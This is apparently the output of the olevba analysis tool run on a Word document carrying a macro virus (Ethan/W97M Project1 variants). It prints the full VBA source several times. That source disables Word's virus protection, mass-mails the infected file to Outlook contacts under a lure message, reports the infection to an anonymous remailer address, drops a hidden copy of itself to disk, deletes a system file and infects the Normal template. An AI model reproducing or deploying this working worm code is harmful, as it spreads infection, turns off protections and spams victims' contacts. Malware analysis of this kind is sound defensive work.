olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan-based-d89ccbba4e29ed253921cd52cced67ac574d3fc9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan-based-d89ccbba4e29ed253921cd52cced67ac574d3fc9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()

On Error Resume Next

s = ActiveDocument.Saved

Application.DisplayStatusBar = 0: Application.DisplayAlerts = 0
Options.VirusProtection = 0: Options.ConfirmConversions = 0
Options.SaveNormalPrompt = 0: Application.EnableCancelKey = 0

Dim POUTLOOK, MAPInam, Newm
Set a = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set t = ThisDocument.VBProject.VBComponents(1).CodeModule
Set n = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set POUTLOOK = CreateObject("Outlook.Application")
Set MAPInam = POUTLOOK.GetNameSpace("MAPI")

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "P1") <> "Syndicate" Then
If POUTLOOK = "Outlook" Then
MAPInam.Logon "profile", "password"
For q = 1 To MAPInam.AddressLists.Count
Set ADBK = MAPInam.AddressLists(q)
Z = 1
Set Newm = POUTLOOK.CreateItem(0)
For CB = 1 To ADBK.AddressEntries.Count
DEM = ADBK.AddressEntries(Z)
Newm.Recipients.Add DEM
Z = Z + 1
If Z > 69 Then CB = ADBK.AddressEntries.Count
Next CB
Newm.Subject = "Fun and games from " & Application.UserName
Newm.Body = "Hi! Check out this neat doc I found on the Internet!"
Newm.Attachments.Add ActiveDocument.FullName
Newm.Send
DEM = ""
Next q

hisyn = "Project1@nym.alias.net"
Newm.Recipients.Add hisyn
Newm.Subject = "Guess whos infected: " & Application.UserName
Newm.Body = "infected!"
Newm.Attachments.Add ActiveDocument.FullName
Newm.Send
MAPInam.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "P1") = "Syndicate"
End If

If a.CountOfLines < t.CountOfLines Then
a.AddFromString t.Lines(1, t.CountOfLines)
ActiveDocument.Save
ElseIf n.CountOfLines < t.CountOfLines Then
n.AddFromString t.Lines(1, t.CountOfLines)
End If

ActiveDocument.Saved = s
'W97M/Project1 by Patient Zero -(The Syndicate)- circa 1999
'The Syndicate: underground to the underground.
'Greets to Kwyjibo and the CodeBreakers: Hey, dont we know each other? ;-)
End Sub





Private Sub Document_New()

End Sub

()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
If Dir("c:\ethan.___", 6) = "" Then
Open "c:\ethan.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\ethan.___", 6
End If
If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
Open "c:\ethan.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
'


On Error Resume Next

s = ActiveDocument.Saved

Application.DisplayStatusBar = 0: Application.DisplayAlerts = 0
Options.VirusProtection = 0: Options.ConfirmConversions = 0
Options.SaveNormalPrompt = 0: Application.EnableCancelKey = 0

Dim POUTLOOK, MAPInam, Newm
Set a = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set t = ThisDocument.VBProject.VBComponents(1).CodeModule
Set n = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set POUTLOOK = CreateObject("Outlook.Application")
Set MAPInam = POUTLOOK.GetNameSpace("MAPI")

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "P1") <> "Syndicate" Then
If POUTLOOK = "Outlook" Then
MAPInam.Logon "profile", "password"
For q = 1 To MAPInam.AddressLists.Count
Set ADBK = MAPInam.AddressLists(q)
Z = 1
Set Newm = POUTLOOK.CreateItem(0)
For CB = 1 To ADBK.AddressEntries.Count
DEM = ADBK.AddressEntries(Z)
Newm.Recipients.Add DEM
Z = Z + 1
If Z > 69 Then CB = ADBK.AddressEntries.Count
Next CB
Newm.Subject = "Fun and games from " & Application.UserName
Newm.Body = "Hi! Check out this neat doc I found on the Internet!"
Newm.Attachments.Add ActiveDocument.FullName
Newm.Send
DEM = ""
Next q

hisyn = "Project1@nym.alias.net"
Newm.Recipients.Add hisyn
Newm.Subject = "Guess whos infected: " & Application.UserName
Newm.Body = "infected!"
Newm.Attachments.Add ActiveDocument.FullName
Newm.Send
MAPInam.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "P1") = "Syndicate"
End If

If a.CountOfLines < t.CountOfLines Then
a.AddFromString t.Lines(1, t.CountOfLines)
ActiveDocument.Save
ElseIf n.CountOfLines < t.CountOfLines Then
n.AddFromString t.Lines(1, t.CountOfLines)
End If

ActiveDocument.Saved = s
'W97M/Project1 by Patient Zero -(The Syndicate)- circa 1999
'The Syndicate: underground to the underground.
'Greets to Kwyjibo and the CodeBreakers: Hey, dont we know each other? ;-)
End Sub





()

End Sub
Private Sub Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
If Dir("c:\ethan.___", 6) = "" Then
Open "c:\ethan.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\ethan.___", 6
End If
If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
Open "c:\ethan.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub

'
()

On Error Resume Next

s = ActiveDocument.Saved

Application.DisplayStatusBar = 0: Application.DisplayAlerts = 0
Options.VirusProtection = 0: Options.ConfirmConversions = 0
Options.SaveNormalPrompt = 0: Application.EnableCancelKey = 0

Dim POUTLOOK, MAPInam, Newm
Set a = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set t = ThisDocument.VBProject.VBComponents(1).CodeModule
Set n = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set POUTLOOK = CreateObject("Outlook.Application")
Set MAPInam = POUTLOOK.GetNameSpace("MAPI")

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "P1") <> "Syndicate" Then
If POUTLOOK = "Outlook" Then
MAPInam.Logon "profile", "password"
For q = 1 To MAPInam.AddressLists.Count
Set ADBK = MAPInam.AddressLists(q)
Z = 1
Set Newm = POUTLOOK.CreateItem(0)
For CB = 1 To ADBK.AddressEntries.Count
DEM = ADBK.AddressEntries(Z)
Newm.Recipients.Add DEM
Z = Z + 1
If Z > 69 Then CB = ADBK.AddressEntries.Count
Next CB
Newm.Subject = "Fun and games from " & Application.UserName
Newm.Body = "Hi! Check out this neat doc I found on the Internet!"
Newm.Attachments.Add ActiveDocument.FullName
Newm.Send
DEM = ""
Next q

hisyn = "Project1@nym.alias.net"
Newm.Recipients.Add hisyn
Newm.Subject = "Guess whos infected: " & Application.UserName
Newm.Body = "infected!"
Newm.Attachments.Add ActiveDocument.FullName
Newm.Send
MAPInam.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "P1") = "Syndicate"
End If

If a.CountOfLines < t.CountOfLines Then
a.AddFromString t.Lines(1, t.CountOfLines)
ActiveDocument.Save
ElseIf n.CountOfLines < t.CountOfLines Then
n.AddFromString t.Lines(1, t.CountOfLines)
End If

ActiveDocument.Saved = s
'W97M/Project1 by Patient Zero -(The Syndicate)- circa 1999
'The Syndicate: underground to the underground.
'Greets to Kwyjibo and the CodeBreakers: Hey, dont we know each other? ;-)
End Sub







On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
If Dir("c:\ethan.___", 6) = "" Then
Open "c:\ethan.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\ethan.___", 6
End If
If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
Open "c:\ethan.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
'


On Error Resume Next

s = ActiveDocument.Saved

Application.DisplayStatusBar = 0: Application.DisplayAlerts = 0
Options.VirusProtection = 0: Options.ConfirmConversions = 0
Options.SaveNormalPrompt = 0: Application.EnableCancelKey = 0

Dim POUTLOOK, MAPInam, Newm
Set a = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set t = ThisDocument.VBProject.VBComponents(1).CodeModule
Set n = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set POUTLOOK = CreateObject("Outlook.Application")
Set MAPInam = POUTLOOK.GetNameSpace("MAPI")

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "P1") <> "Syndicate" Then
If POUTLOOK = "Outlook" Then
MAPInam.Logon "profile", "password"
For q = 1 To MAPInam.AddressLists.Count
Set ADBK = MAPInam.AddressLists(q)
Z = 1
Set Newm = POUTLOOK.CreateItem(0)
For CB = 1 To ADBK.AddressEntries.Count
DEM = ADBK.AddressEntries(Z)
Newm.Recipients.Add DEM
Z = Z + 1
If Z > 69 Then CB = ADBK.AddressEntries.Count
Next CB
Newm.Subject = "Fun and games from " & Application.UserName
Newm.Body = "Hi! Check out this neat doc I found on the Internet!"
Newm.Attachments.Add ActiveDocument.FullName
Newm.Send
DEM = ""
Next q

hisyn = "Project1@nym.alias.net"
Newm.Recipients.Add hisyn
Newm.Subject = "Guess whos infected: " & Application.UserName
Newm.Body = "infected!"
Newm.Attachments.Add ActiveDocument.FullName
Newm.Send
MAPInam.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "P1") = "Syndicate"
End If

If a.CountOfLines < t.CountOfLines Then
a.AddFromString t.Lines(1, t.CountOfLines)
ActiveDocument.Save
ElseIf n.CountOfLines < t.CountOfLines Then
n.AddFromString t.Lines(1, t.CountOfLines)
End If

ActiveDocument.Saved = s
'W97M/Project1 by Patient Zero -(The Syndicate)- circa 1999
'The Syndicate: underground to the underground.
'Greets to Kwyjibo and the CodeBreakers: Hey, dont we know each other? ;-)
End Sub





()

End Sub
Private Sub Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
If Dir("c:\ethan.___", 6) = "" Then
Open "c:\ethan.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\ethan.___", 6
End If
If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
Open "c:\ethan.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub

Private Sub Document_Open()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

